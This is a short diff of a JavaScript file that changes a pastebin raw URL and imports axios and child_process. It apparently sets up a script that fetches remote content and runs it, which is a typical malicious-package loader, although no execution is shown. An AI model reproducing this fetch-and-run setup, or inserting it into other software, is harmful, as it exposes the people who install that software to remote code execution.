@@ -1,4 +1,4 @@
-const url = 'https://pastebin.com/raw/s919gMWV';
+const url = 'https://pastebin.com/raw/BwutnZ06';
 const axios = require("axios");
 const child_process = require("child_process");
 const process = require("process");
